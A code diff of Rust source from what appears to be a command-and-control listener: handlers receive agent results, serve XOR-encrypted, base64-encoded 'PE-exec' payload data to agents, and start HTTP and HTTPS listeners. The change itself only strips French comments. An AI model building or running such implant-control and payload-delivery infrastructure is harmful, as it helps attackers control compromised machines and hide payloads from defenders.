@@ -578,7 +578,6 @@ async fn handle_submit_result(
                     "[!] Failed to decode base64 output (might be plain text): {}",
                     e
                 );
-                // Si ce n'est pas du Base64, c'est peut-être du texte brut
                 result.output.clone()
             }
         };
@@ -705,7 +704,6 @@ async fn get_pe_exec_data(
     State(state): State<Arc<HttpListenerState>>,
     Path(command_id): Path<i64>,
 ) -> impl IntoResponse {
-    // ✅ Changé de Response à impl IntoResponse
     log::info!(
         "[PE-DATA] Agent requesting PE-exec data for command {}",
         command_id
@@ -713,14 +711,12 @@ async fn get_pe_exec_data(
 
     match state.database.get_pe_exec_data_by_command(command_id) {
         Ok(Some(pe_json_data)) => {
-            // ✅ C'est déjà du JSON, pas du base64
             log::info!(
                 "[PE-DATA] ✅ PE-exec data found | command={} | size={} bytes",
                 command_id,
                 pe_json_data.len()
             );
 
-            // ✅ Chiffrer directement le JSON avec XOR
             let encrypted_payload = state.xor_cipher.encrypt(pe_json_data.as_bytes());
 
             log::info!(
@@ -728,7 +724,6 @@ async fn get_pe_exec_data(
                 encrypted_payload.len()
             );
 
-            // ✅ Encoder en Base64 pour le transport HTTP
             let final_response = STANDARD.encode(&encrypted_payload);
 
             log::info!(
@@ -781,11 +776,9 @@ async fn get_pe_exec_data(
     }
 }
 
-// ===== FONCTION START AVEC CHARGEMENT DES AGENTS =====
 pub async fn start(profile: ListenerProfile, agent_handler: AgentHandler, database: Arc<Database>) {
     let xor_cipher = Arc::new(XORCipher::new(&profile.xor_key));
 
-    // ===== NOUVEAU: Charger les agents existants depuis la DB =====
     log::info!(
         "[*] Loading existing agents for listener '{}'...",
         profile.name
@@ -828,7 +821,6 @@ pub async fn start(profile: ListenerProfile, agent_handler: AgentHandler, databa
     }
 }
 
-// ===== FONCTION START_HTTPS AVEC TLS =====
 pub async fn start_https(
     profile: ListenerProfileHttps,
     agent_handler: AgentHandler,
@@ -854,7 +846,6 @@ pub async fn start_https(
         }
     }
 
-    // ===== Configuration TLS avec rustls =====
     let tls_config = match RustlsConfig::from_pem(
         profile.tls_cert.as_bytes().to_vec(),
         profile.tls_key.as_bytes().to_vec(),
@@ -872,7 +863,6 @@ pub async fn start_https(
         }
     };
 
-    // Créer un profil HTTP standard pour réutiliser les handlers existants
     let http_profile = ListenerProfile {
         name: profile.name.clone(),
         host: profile.host.clone(),
